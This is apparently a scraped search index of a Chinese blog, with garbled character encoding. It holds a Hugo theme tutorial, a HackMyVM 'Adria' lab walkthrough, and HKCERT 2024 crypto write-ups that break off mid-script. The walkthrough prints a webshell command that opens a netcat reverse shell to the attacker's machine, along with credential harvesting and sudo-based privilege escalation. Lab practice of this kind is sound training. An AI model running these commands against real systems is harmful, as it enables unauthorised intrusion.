}}){ alert('å¯†ç é”™è¯¯ï¼'); if (history.length === 1) { window.opener = null; window.open('', '_self'); window.close(); } else { history.back(); } } } })(); \u003c/script\u003e {{- end -}} ä¹‹åæˆ‘ä»¬åªè¦å°† password å‚æ•°æ·»åŠ åˆ°æ–‡ç« å¤´å³å¯ã€‚ ä½†ä¸ºäº†æ–¹ä¾¿èµ·è§ï¼Œæˆ‘è¿™é‡Œç›´æ¥æŠŠå®ƒåŠ åˆ°äº†æ¨¡æ¿æ–‡ä»¶ä¸­ï¼Œå³åœ¨åšå®¢çš„æ ¹ç›®å½•ä¸‹æ‰¾åˆ°your_site\\archetypes\\default.mdå¹¶æ‰“å¼€ï¼ŒæŠŠ password å‚æ•°æ·»åŠ è¿›å»ï¼Œå¦‚ä¸‹ä»£ç å—ï¼š --- title: \"{{ replace .TranslationBaseName \"-\" \" \" | title }}\" slug: \"{{ replace .TranslationBaseName \"-\" \" \" | title }}\" ... ... password: \"\" ... ... --- ","date":"2025-02-25","objectID":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/:2:4","tags":["hugo"],"title":"Hugoæ­å»ºä»¥åŠä¸»é¢˜å®Œå–„","uri":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/"},{"categories":["é…ç½®"],"content":"ä¿®æ”¹äºŒçº§æ ‡é¢˜ï¼Œè¡Œå†…ä»£ç å’Œåˆ†å‰²çº¿ç­‰æ ·å¼ äºŒçº§æ ‡é¢˜çš„ä¿®æ”¹ åŸä¸»é¢˜çš„äºŒçº§æ ‡é¢˜æˆ‘ä¸å¥½è¯„ä»·ï¼Œå®ƒè·Ÿä¸‹ä¸€çº§çš„æ ‡é¢˜å‡ ä¹åŒºåˆ†ä¸å¼€ï¼Œè¿™å¯¼è‡´æ–‡ç« çœ‹èµ·æ¥æ²¡æœ‰æ¡ç†ã€‚å› æ­¤åœ¨è¿™é‡Œæˆ‘ä»¬å°†ä¿®æ”¹äºŒçº§æ ‡é¢˜çš„æ ·å¼ä»¥åšåŒºåˆ†ã€‚ æ‰¾åˆ°your_site\\assets\\css_custom.scssæ–‡ä»¶ï¼Œåœ¨é‡Œé¢æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š /* æ ‡é¢˜ */ .page.single h2 { box-shadow: rgb(95, 90, 75) 0px 0px 0px 1px, rgba(10, 10, 0, 0.5) 1px 1px 6px 1px; color: rgb(255, 255, 255); font-family: å¾®è½¯é›…é»‘, å®‹ä½“, é»‘ä½“, Arial; font-weight: bold; line-height: 1.3; text-shadow: rgb(34, 34, 34) 2px 2px 3px; background: rgb(43, 102, 149); border-radius: 6px; border-width: initial; border-style: none; border-color: initial; border-image: initial; padding: 7px; margin: 18px 0px 18px -5px !important; } è¡Œå†…ä»£ç  åŸä¸»é¢˜çš„è¡Œå†…ä»£ç èƒ½ç”¨ï¼Œä½†åªèƒ½ç”¨ä¸€ç‚¹ç‚¹ï¼Œå®åœ¨æ˜¯ä¸æ­£æ–‡åŒºåˆ†ä¸å¼€ï¼Œæ‰€ä»¥åœ¨è¿™ä¿®æ”¹ä¸€ä¸‹å®ƒçš„æ ·å¼ã€‚ æ‰¾åˆ°your_site\\assets\\css_custom.scssæ–‡ä»¶ï¼Œåœ¨é‡Œé¢æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š /* è¡Œå†…ä»£ç å— */ code { margin: 0 .2rem; font-size: .9em; border: 1px solid #d6d6d6; border-radius: .2rem; } /* é¢„æ ¼å¼ä»£ç å—(ç”¨tabé”®æ’å…¥çš„ä»£ç å—) */ pre code { margin: 0; border: none; font-size: .875rem; } /* æ ‡é¢˜é‡Œçš„ä»£ç å—æ ·å¼ */ .page.single .content\u003eh2 code { color: #f7ab01; background: transparent !important; border: none; } åˆ†å‰²çº¿ åœ¨åŸä¸»é¢˜ä¸­åˆ†å‰²çº¿å‡ ä¹çœ‹ä¸åˆ°ï¼Œè¿™é‡Œä¿®æ”¹ä¸€ä¸‹ã€‚ æ‰¾åˆ°your_site\\assets\\css_custom.scssæ–‡ä»¶ï¼Œåœ¨é‡Œé¢æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š /* åˆ†éš”çº¿ */ hr { border: none; border-bottom: 2px dashed #7a7a7a !important; } é¡µè„šåˆ†å‰²çº¿ é¡µè„šå†…å®¹ä¸å…¶ä»–å†…å®¹è¿åœ¨ä¸€èµ·æœ‰ç‚¹æ‚ä¹±ï¼Œå› æ­¤æ·»åŠ ä¸€ä¸ªé¡µè„šçš„åˆ†å‰²çº¿è¿˜æ˜¯å¾ˆæœ‰å¿…è¦çš„ã€‚ æ‰¾åˆ°your_site\\assets\\css_custom.scssæ–‡ä»¶ï¼Œåœ¨é‡Œé¢æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š /* é¡µè„šåˆ†å‰²çº¿ */ .footer { display: block; border-top-width: 3px; border-top-style: solid; border-top-color: #96c1db; position: relative; z-index: -1; max-width: 800px; width: 60%; margin: .5rem auto 0 auto; padding-left: 0rem; padding-right: 0rem; } @media only screen and (max-width: 1440px) { .footer { width:54.5% } } @media only screen and (max-width: 1200px) { .footer { width:50.5% } } @media only screen and (max-width: 960px) { .footer { width: 77% } } @media only screen and (max-width: 680px) { .footer { width: 95% } } ","date":"2025-02-25","objectID":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/:2:5","tags":["hugo"],"title":"Hugoæ­å»ºä»¥åŠä¸»é¢˜å®Œå–„","uri":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/"},{"categories":["é…ç½®"],"content":"å‹é“¾ æ·»åŠ å‹é“¾å¡ç‰‡ æ·»åŠ friend.htmlæ–‡ä»¶ åœ¨your_site\\layouts\\shortcodes\\è·¯å¾„ä¸‹ï¼Œæ–°åˆ›å»ºæ–‡ä»¶friend.htmlï¼Œå¹¶ä¸”åœ¨é‡Œé¢æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š {{ if .IsNamedParams }} {{- $src := .Get \"logo\" -}} {{- $small := .Get \"logo_small\" | default $src -}} {{- $large := .Get \"logo_large\" | default $src -}} \u003cdiv class=\"friend-div\"\u003e \u003ca target=\"_blank\" href={{ .Get \"url\" | safeURL }} title={{ .Get \"name\" }} \u003e \u003cimg class=\"lazyload\" src=\"/svg/loading.min.svg\" data-src={{ $src | safeURL }} alt={{ .Get \"name\" }} data-sizes=\"auto\" data-srcset=\"{{ $small | safeURL }}, {{ $src | safeURL }} 1.5x, {{ $large | safeURL }} 2x\" /\u003e \u003cspan class=\"friend-name\"\u003e{{ .Get \"name\" }}\u003c/span\u003e \u003cspan class=\"friend-info\"\u003e{{ .Get \"word\" }}\u003c/span\u003e \u003c/a\u003e \u003c/div\u003e {{ end }} æ·»åŠ _friend.scssæ–‡ä»¶ åœ¨your_site\\assets\\css_partial_single\\è·¯å¾„ä¸‹ï¼ˆå¦‚æœæ²¡æœ‰å°±è‡ªå·±åˆ›å»ºï¼‰ï¼Œæ–°å»ºæ–‡ä»¶_friend.scssï¼Œå¹¶åœ¨é‡Œé¢æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š #article-container { word-wrap: break-word; overflow-wrap: break-word } #article-container a { color: #49b1f5 } #article-container a:hover { text-decoration: underline } #article-container img { margin: 0 auto .8rem } .flink#article-container .friend-list-div \u003e .friend-div a .friend-info, .flink#article-container .friend-list-div \u003e .friend-div a .friend-name { overflow: hidden; -o-text-overflow: ellipsis; text-overflow: ellipsis; white-space: nowrap } .flink#article-container .friend-list-div { overflow: auto; padding: 10px 10px 0; text-align: center; } .flink#article-container .friend-list-div \u003e .friend-div { position: relative; float: left; overflow: hidden; margin: 15px 7px; width: calc(100% / 3 - 15px); height: 90px; border-radius: 8px; line-height: 17px; -webkit-transform: translateZ(0) } @media screen and (max-width: 1100px) { .flink#article-container .friend-list-div \u003e .friend-div { width: calc(50% - 15px) !important } @media screen and (max-width: 600px) { .flink#article-container .friend-list-div \u003e .friend-div { width: calc(100% - 15px) !important } } } .flink#article-container .friend-list-div \u003e .friend-div:hover { background: rgba(87, 142, 224, 0.15); } .flink#article-container .friend-list-div \u003e .friend-div:hover img { -webkit-transform: rotate(360deg); -moz-transform: rotate(360deg); -o-transform: rotate(360deg); -ms-transform: rotate(360deg); transform: rotate(360deg) } .flink#article-container .friend-list-div \u003e .friend-div:before { position: absolute; top: 0; right: 0; bottom: 0; left: 0; z-index: -1; background: var(--text-bg-hover); content: ''; -webkit-transition: -webkit-transform .3s ease-out; -moz-transition: -moz-transform .3s ease-out; -o-transition: -o-transform .3s ease-out; -ms-transition: -ms-transform .3s ease-out; transition: transform .3s ease-out; -webkit-transform: scale(0); -moz-transform: scale(0); -o-transform: scale(0); -ms-transform: scale(0); transform: scale(0) } .flink#article-container .friend-list-div \u003e .friend-div:hover:before, .flink#article-container .friend-list-div \u003e .friend-div:focus:before, .flink#article-container .friend-list-div \u003e .friend-div:active:before { -webkit-transform: scale(1); -moz-transform: scale(1); -o-transform: scale(1); -ms-transform: scale(1); transform: scale(1) } .flink#article-container .friend-list-div \u003e .friend-div a { color: var(--font-color); text-decoration: none } .flink#article-container .friend-list-div \u003e .friend-div a img{ float: left; margin: 15px 10px; width: 60px; height: 60px; border-radius: 35px; -webkit-transition: all .3s; -moz-transition: all .3s; -o-transition: all .3s; -ms-transition: all .3s; transition: all .3s } .flink#article-container .friend-list-div \u003e .friend-div a .friend-name { display: block; padding: 16px 10px 0 0; height: 40px; font-weight: 700; font-size: 20px } .flink#article-container .friend-list-div \u003e .friend-div a .friend-info { display: block; padding: 1px 10px 1px 0; height: 50px; font-size: 13px } åœ¨_single.scssä¸­å¼•å…¥ä»£ç  æŠŠyour_site\\themes\\LoveIt\\assets\\css_page_single.scsså¤åˆ¶ç²˜è´´åˆ°è·¯å¾„your_site\\assets\\css_page\\ä¸‹ã€‚ å†åœ¨æ–‡ä»¶your_site\\assets\\css_page_single.scssé‡Œæ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š @import \"../_partial/_single/friend\"; åˆ›å»ºå‹é“¾é¡µé¢ åˆ›å»ºfriend/index.mdæ–‡ä»¶ å…ˆnewä¸€ä¸ª hugo new friend/index.md å†™å…¥ ","date":"2025-02-25","objectID":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/:2:6","tags":["hugo"],"title":"Hugoæ­å»ºä»¥åŠä¸»é¢˜å®Œå–„","uri":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/"},{"categories":["é…ç½®"],"content":"éƒ¨ç½²åˆ°æœåŠ¡å™¨ å› ä¸ºæˆ‘ç”¨çš„æ˜¯æœåŠ¡å™¨éƒ¨ç½²ï¼Œè¿™é‡Œåªè¯´æœåŠ¡å™¨çš„æ–¹æ³• å®‰è£…å®å¡”ï¼ˆæ–¹ä¾¿ï¼Œä¸”é€‚åˆæ‰€æœ‰äººï¼‰ åˆ›å»ºä¸€ä¸ªç½‘ç«™ï¼Œå¹¶æŠŠç½‘ç«™æ ¹ç›®å½•æŒ‡å‘ä½ çš„hugoç”Ÿæˆçš„publicæ–‡ä»¶å¤¹ åŒæ­¥ æˆ‘é‡‡ç”¨çš„æœ¬åœ°ç¼–å†™ï¼Œç¼–è¯‘åç”¨rsyncåŒæ­¥åˆ°æœåŠ¡å™¨ ä¸æ–­æ›´æ–°ç»´æŠ¤å³å¯ ","date":"2025-02-25","objectID":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/:3:0","tags":["hugo"],"title":"Hugoæ­å»ºä»¥åŠä¸»é¢˜å®Œå–„","uri":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/"},{"categories":["é¶åœº"],"content":"HMV Adria ","date":"2025-02-25","objectID":"/hmv_adria/:1:0","tags":["æ¸—é€"],"title":"HMV Adria","uri":"/hmv_adria/"},{"categories":["é¶åœº"],"content":"é¶åœºé“¾æ¥ https://hackmyvm.eu/machines/machine.php?vm=Adria ","date":"2025-02-25","objectID":"/hmv_adria/:1:1","tags":["æ¸—é€"],"title":"HMV Adria","uri":"/hmv_adria/"},{"categories":["é¶åœº"],"content":"æ—¥å¸¸æ‰«æ â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ sudo arp-scan -l Interface: eth0, type: EN10MB, MAC: 12:37:b3:be:69:38, IPv4: 192.168.31.183 WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.31.1 58:ea:1f:38:ff:17 (Unknown) 192.168.31.102 08:00:27:96:ce:01 (Unknown) 192.168.31.186 42:60:96:7b:26:bd (Unknown: locally administered) 3 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 1.864 seconds (137.34 hosts/sec). 3 responded â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -sV -sC -T4 -Pn -p- 192.168.31.102 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-24 22:21 HKT Nmap scan report for 192.168.31.102 Host is up (0.0014s latency). Not shown: 65531 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2 (protocol 2.0) | ssh-hostkey: | 256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA) |_ 256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519) 80/tcp open http Apache httpd 2.4.57 ((Debian)) |_http-title: Did not follow redirect to http://adria.hmv/ | http-robots.txt: 7 disallowed entries | /backup/ /cron/? /front/ /install/ /panel/ /tmp/ |_/updates/ |_http-server-header: Apache/2.4.57 (Debian) 139/tcp open netbios-ssn Samba smbd 4.6.2 445/tcp open netbios-ssn Samba smbd 4.6.2 MAC Address: 08:00:27:96:CE:01 (Oracle VirtualBox virtual NIC) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel æˆ‘è¯´ç›´æ¥curl80æ²¡æœ‰ä¸œè¥¿ï¼Œä»–æœ‰ä¸ªé‡å®šå‘ï¼Œå†™å…¥åˆ°/etc/hostsï¼Œç„¶åè®¿é—®å°±è¡Œäº† æ‰«ä¸€ä¸‹ç›®å½• â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ dirsearch -u http://192.168.31.102 -i 200,301 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html from pkg_resources import DistributionNotFound, VersionConflict _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 Wordlist size: 11460 Output File: /home/kali/reports/http_192.168.31.102/_25-02-24_22-30-28.txt Target: http://192.168.31.102/ [22:30:28] Starting: [22:30:39] 200 - 247B - /.gitignore [22:31:41] 200 - 15KB - /changelog.txt [22:31:47] 200 - 4KB - /CONTRIBUTING.md [22:31:58] 200 - 851B - /favicon.ico [22:32:13] 200 - 12KB - /license.txt [22:32:29] 200 - 1KB - /panel.php [22:32:29] 200 - 1KB - /panel.aspx [22:32:30] 200 - 1KB - /panel.jsp [22:32:30] 200 - 1KB - /panel.html [22:32:30] 200 - 1KB - /panel/ [22:32:44] 200 - 5KB - /README.md [22:32:47] 200 - 94B - /robots.txt [22:32:55] 200 - 212B - /sitemap.xml Task Completed /panel.phpæ˜¯åå°é¡µé¢ï¼Œæœ€æœ‰ç”¨çš„ä¿¡æ¯\" Powered by Subrion CMS v4.2.1\" ","date":"2025-02-25","objectID":"/hmv_adria/:1:2","tags":["æ¸—é€"],"title":"HMV Adria","uri":"/hmv_adria/"},{"categories":["é¶åœº"],"content":"åå¼¹shell smbå¯åŠ¨çœ‹çœ‹ â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ smbclient -L //192.168.31.102 -N Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers DebianShare Disk IPC$ IPC IPC Service (Samba 4.17.12-Debian) nobody Disk Home Directories Reconnecting with SMB1 for workgroup listing. smbXcli_negprot_smb1_done: No compatible protocol selected by server. Protocol negotiation to server 192.168.31.102 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE Unable to connect with SMB1 -- no workgroup available â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop] â””â”€$ smbclient //192.168.31.102/DebianShare Password for [WORKGROUP\\kali]: Try \"help\" to get a list of possible commands. smb: \\\u003e ls . D 0 Mon Dec 4 17:32:45 2023 .. D 0 Sat Jul 22 16:10:13 2023 configz.zip N 2756857 Mon Nov 6 23:56:25 2023 19480400 blocks of size 1024. 15686980 blocks available smb: \\\u003e get configz.zip getting file \\configz.zip of size 2756857 as configz.zip (26655.8 KiloBytes/sec) (average 26655.9 KiloBytes/sec) smb: \\\u003e çœ‹çœ‹zipé‡Œé¢æœ‰ä»€ä¹ˆï¼Œè§£å‹çœ‹çœ‹ â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop] â””â”€$ cd configz â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/configz] â””â”€$ ls boot isolinux preseed â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/configz] â””â”€$ grep -r \"user\" preseed/master.preseed:d-i passwd/user-fullname string admin preseed/master.preseed:d-i passwd/username string admin preseed/master.preseed:d-i passwd/user-password password jojo1989 preseed/master.preseed:d-i user-setup/allow-password-weak boolean true preseed/master.seed:# To create a normal user account. preseed/master.seed:d-i passwd/user-fullname string Adam Lewis preseed/master.seed:d-i passwd/username string alewis preseed/master.seed:# Normal user's password, either in clear text preseed/master.seed:#d-i passwd/user-password password insecure preseed/master.seed:#d-i passwd/user-password-again password insecure preseed/master.seed:d-i passwd/user-password-crypted 158f5ddb69d03f91bb449ee170913268 preseed/master.seed:# Create the first user with the specified UID instead of the default. preseed/master.seed:d-i passwd/user-uid string 1010 preseed/master.seed:#d-i user-setup/allow-password-weak boolean true grep: boot/grub/x86_64-efi/legacycfg.mod: binary file matches grep: boot/grub/x86_64-efi/read.mod: binary file matches grep: boot/grub/x86_64-efi/password.mod: binary file matches grep: boot/grub/x86_64-efi/password_pbkdf2.mod: binary file matches grep: boot/grub/x86_64-efi/bsd.mod: binary file matches grep: boot/grub/efi.img: binary file matches grep: isolinux/libcom32.c32: binary file matches isolinux/ks.cfg:#Initial user isolinux/ks.cfg:user cscience --fullname \"Coin Science\" --iscrypted --password $1$cw7eQ/70$/8ZeZKBBBJPtIFdnibj/X/ grep: isolinux/en.hlp: binary file matches grep: isolinux/nb.tr: binary file matches isolinux/f9.txt:and the next user who comes up with the same problem will profit from your grep: isolinux/ldlinux.c32: binary file matches grep: isolinux/bootlogo: binary file matches grep: isolinux/si.hlp: binary file matches grep: isolinux/ka.hlp: binary file matches åˆ©ç”¨grepç›´æ¥æŸ¥æ‰¾æƒ³è¦çš„ä¿¡æ¯admin/jojo1989 è¿›å…¥åå°ï¼ŒæŸ¥æ‰¾cmså¯¹åº”ç‰ˆæœ¬æ¼æ´ï¼Œæ˜¯æ–‡ä»¶ä¸Šä¼ .pharï¼Œä¼ ä¸ªä¸€å¥è¯æœ¨é©¬ä¸Šå» http://192.168.31.102/uploads/shell.phar?cmd=nc%20-e%20/bin/bash%20192.168.31.183%204444 é¡ºä¾¿/usr/bin/script -qc /bin/bash /dev/nullæ‹‰ä¸ªäº¤äº’å¼ç»ˆç«¯ ","date":"2025-02-25","objectID":"/hmv_adria/:1:3","tags":["æ¸—é€"],"title":"HMV Adria","uri":"/hmv_adria/"},{"categories":["é¶åœº"],"content":"ææƒ å…ˆçœ‹çœ‹è¿™ä¸ªèƒ½å¹²å•¥ www-data@adria:/var/www/html/uploads$ sudo -l sudo -l sudo: unable to resolve host adria: No address associated with hostname Matching Defaults entries for www-data on adria: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty User www-data may run the following commands on adria: (adriana) NOPASSWD: /usr/bin/scalar scalarè™½ç„¶è‡ªèº«æ²¡æœ‰ç›´æ¥æ‰§è¡Œå‘½ä»¤çš„èƒ½åŠ›ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡æ‰‹åŠ¨è¾“å…¥è„šæœ¬ç„¶ååƒpythoné‚£æ ·é€è¡Œè§£é‡Šè¿è¡Œã€‚ å¯ä»¥åœ¨è¯¥å·¥å…·çš„äº¤äº’å¼è¾“å…¥!shæ¥è·å–adrianaç”¨æˆ·çš„shell sudo -u adriana /usr/bin/scalar list å¾—åˆ°ç”¨æˆ·æƒé™å’Œflag sudo -l sudo: unable to resolve host adria: No address associated with hostname Matching Defaults entries for adriana on adria: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty User adriana may run the following commands on adria: (ALL : ALL) NOPASSWD: /opt/backup è¿™æ¬¡å¯ä»¥æ‰§è¡Œçš„æ˜¯ä¸ªbackup cat /opt/backup #!/bin/bash PASSWORD=$(/usr/bin/cat /root/pass) read -ep \"Password: \" USER_PASS if [[ $PASSWORD == $USER_PASS ]] ; then /usr/bin/echo \"Authorized access\" /usr/bin/sleep 1 /usr/bin/zip -r -e -P \"$PASSWORD\" /opt/backup.zip /var/www/html else /usr/bin/echo \"Access denied\" exit 1 fi è¿™ä¸ªè„šæœ¬æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯ç¬¬7è¡Œçš„ $PASSWORD == $USER_PASS ä¸¤ä¸ªå˜é‡éƒ½æ²¡æœ‰åŠ ä¸Šå¼•å·ï¼Œå‘ˆç°ä¸Šå°±æ˜¯å¦‚æœè¾“å…¥é€šé…ç¬¦æˆ–è€…ï¼Ÿçš„è¯ä¼šç›´æ¥åŒ¹é…æˆçœŸ, æ‰€ä»¥æˆ‘ä»¬å¯¹äºbackupè¿™ä¸ªè„šæœ¬ä¹Ÿåªéœ€è¦è¾“å…¥å³å¯ã€‚åªä¸è¿‡å¯†ç ä¸ä¼šç›´æ¥æ‰“å°å‡ºæ¥ï¼Œéœ€è¦èµ·å¦ä¸€ä¸ªè¿›ç¨‹ç›‘è§†åå°å³å¯ watch -n 0.1 -d â€œps aux | grep -ai /usr/bin/zipâ€ å¾—åˆ°å¯†ç  ","date":"2025-02-25","objectID":"/hmv_adria/:1:4","tags":["æ¸—é€"],"title":"HMV Adria","uri":"/hmv_adria/"},{"categories":["CTF"],"content":"å‰è¨€ è·ç¦»åˆèµ›è¿‡äº†å¥½ä¹…å¥½ä¹…ï¼Œå¤ç°ä¸€ç›´æ²¡å’‹æï¼Œnssä¸Šæœ‰ç¯å¢ƒï¼Œæœ€è¿‘å¤ç°ä¸€ä¸‹ï¼Œä¸»è¦æ˜¯é‚£å‡ ä¸ªlcgå’Œrsa ","date":"2025-02-24","objectID":"/hkcert2024/:1:0","tags":["crypto"],"title":"Hkcert2024","uri":"/hkcert2024/"},{"categories":["CTF"],"content":"é¢˜ç›® ","date":"2025-02-24","objectID":"/hkcert2024/:2:0","tags":["crypto"],"title":"Hkcert2024","uri":"/hkcert2024/"},{"categories":["CTF"],"content":"Almost DSA task import os from Crypto.Util.number import getPrime as get_prime from Crypto.Util.number import isPrime as is_prime import secrets import hashlib # Computes the inverse of a mod prime p def inverse(a, p): return pow(a, p-2, p) def hash(m): h = hashlib.sha256(m).digest() return int.from_bytes(h, 'big') def generate_parameters(): # FIPS 186-4 specifies that p and q can be of (2048, 256) bits while True: q = get_prime(256) r = secrets.randbits(2048-256) p = r*q + 1 if p.bit_length() != 2048: continue if not is_prime(p): continue break h = 1 while True: h += 1 g = pow(h, (p-1)//q, p) if g == 1: continue break return p, q, g def sign(params, x, m): p, q, g = params k = secrets.randbelow(q) r = pow(g, k, p) % q s = inverse(k, q) * (hash(m) + x*r) % q return (r, s) def verify(params, y, m, sig): p, q, g = params r, s = sig assert 0 \u003c r \u003c p assert 0 \u003c s \u003c p w = inverse(s, q) u1 = hash(m) * w % q u2 = r * w % q v = pow(g, u1, p) * pow(y, u2, p) % p % q assert v == r def main(): # The parameters were generated by generate_parameters(), which will take some time to generate. # With that reason, we will use a fixed one instead of a random one. p = 17484281359996796703320753329289113133879315487679543624741105110874484027222384531803606958810995970161525595158267517181794414300756262340838882222415769778596720783078367872913954804658072233160036557319401158197234539657653635114116129319712841746177858547689703847179830876938850791424742190500438426350633498257950965188623233005750174576134802300600490139756306854032656842920490457629968890761814183283863329460516285392831741363925618264196019954486854731951282830652117210758060426483125525221398218382779387124491329788662015827601101640859700613929375036792053877746675842421482667089024073397901135900307 q = 113298192013516195145250438847099037276290008150762924677454979772524099733149 g = 2240914810379680126339108531401169275595161144670883986559069211999660898639987625873945546061830376966978596453328760234030133281772778843957617704660733666090807506024220142764237508766050356212712228439682713526208998745633642827205871276203625236122884797705545378063530457025121059332887929777555045770309256917282489323413372739717067924463128766609878574952525765509768641958927377639405729673058327662319958260422021309804322093360414034030331866591802559201326691178841972572277227570498592419367302032451643108376739154217604459747574970395332109358575481017157712896404133971465638098583730000464599930248 print(f'{p = }') print(f'{q = }') print(f'{g = }') x = secrets.randbelow(q) y = pow(g, x, p) print(f'{y = }') m = b'gib flag' r = int(input('r = ')) s = int(input('s = ')) verify((p, q, g), y, m, (r, s)) flag = os.getenv('FLAG', 'hkcert24{***REDACTED***}') print(flag) if __name__ == '__main__': main() æ¯”èµ›çš„æ—¶å€™ä»¥ä¸ºæ˜¯ä¸€ä¸ªå¾ˆå¤æ‚çš„æ ¹æ®dsaåŸç†å»åšçš„é¢˜ç›®ï¼Œåé¢å‘ç°è‡ªå·±è¿˜æ˜¯å¤ªè ¢äº†ï¼Œåªè¦å–ä¸€å¯¹æ­£ç¡®çš„rså€¼å°±è¡Œäº†ï¼Œå…¶å®å°±æ˜¯åœ¨æ‰¾ä»–è¿™ä¸ªå¯†ç é¢˜çš„æ¼æ´ï¼Œr=1æ—¶s=qå³ç¬¦åˆè¦æ±‚ ","date":"2025-02-24","objectID":"/hkcert2024/:2:1","tags":["crypto"],"title":"Hkcert2024","uri":"/hkcert2024/"},{"categories":["CTF"],"content":"Mask-mask-RSA task from Crypto.Util.number import getPrime, bytes_to_long FLAG = b'flag{this_is_a_test_flag}' def mask_expr(expr): global e, n assert '**' not in expr, \"My computer is weak, I can't handle this insane calculation\" assert len(expr) \u003c= 4, \"Too long!\" assert all([c in r'pq+-*/%' for c in expr]), \"Don't try to break me\" res = eval(expr) return str(pow(res, e, n))[::2] if __name__ == '__main__': e = 65537 p, q = 1, 1 while p == q: while (p-1) % e == 0: p = getPrime(513) while (q-1) % e == 0: q = getPrime(513) m = bytes_to_long(FLAG) n = p * q c = pow(m, e, n) print(f'{c = }') for _ in range(6): expr = input('Input your expression in terms of p, q and r: ') print(mask_expr(expr)) ä»–æ˜¯ä¸€ä¸ªæ”¹ç¼–é¢˜ï¼ŒåŸç‰ˆæ˜¯ https://github.com/OfficialCyberSpace/CSCTF-2024/tree/main/crypto/mask-rsa ï¼Œä¿®æ”¹åœ°æ–¹å°±æ˜¯e=3 -\u003e 65537ï¼Œè¿˜æœ‰äº¤äº’çš„å†…å®¹å‘é€æ¥æ”¶ä¸åŒäº†ï¼Œæˆ‘ä»¬æ ¹æ®åŸé¢˜ç›®çš„expå»ä¿®æ”¹é€‚é…å°±è¡Œäº† from pwn import * from math import gcd from Crypto.Util.number import isPrime as is_prime def attempt(id): e = 65537 log.info(f'attempt #{id}') r = remote('node7.anna.nssctf.cn',24426) r.recvuntil(b'c = ') c0 = int(r.recvline().decode()) r.sendline(b'p') r.sendline(b'q') r.sendline(b'p+q') r.recvuntil(b'Input your expression in terms of p, q and r: ') s1 = int(r.recvline().decode()) # a := p^e mod n r.recvuntil(b'Input your expression in terms of p, q and r: ') s2 = int(r.recvline().decode()) # b := q^e mod n r.recvuntil(b'Input your expression in terms of p, q and r: ') s3 = int(r.recvline().decode()) # c := (p^e + q^e) mod n # s1 and s2 are of different lengths if set([len(str(s1)), len(str(s2))]) != set([154, 155]): r.close() return False # Require that a + b = c if len(str(s3)) != 155: r.close() return False if len(str(s1)) \u003c len(str(s2)): # p \u003c q s1, s2 = s2, s1 r.sendline(b'q-p') r.sendline(b'p+p') r.sendline(b'-q%p') else: # p \u003e q r.sendline(b'p-q') r.sendline(b'q+q') r.sendline(b'-p%q') # Nonetheless, we have p \u003e q now. r.recvuntil(b'Input your expression in terms of p, q and r: ') s4 = int(r.recvline().decode()) # s4 := (p^e - q^e) mod n r.recvuntil(b'Input your expression in terms of p, q and r: ') s5 = int(r.recvline().decode()) # s5 := (2^e q^e) mod n r.recvuntil(b'Input your expression in terms of p, q and r: ') s6 = int(r.recvline().decode()) # s6 := (-p^e - 2^e q^e) mod n if len(str(s4)) != 154: r.close() return False if len(str(s5)) != 155: r.close() return False if len(str(s6)) != 154: r.close() return False _a = [None for _ in range(309)] _b = 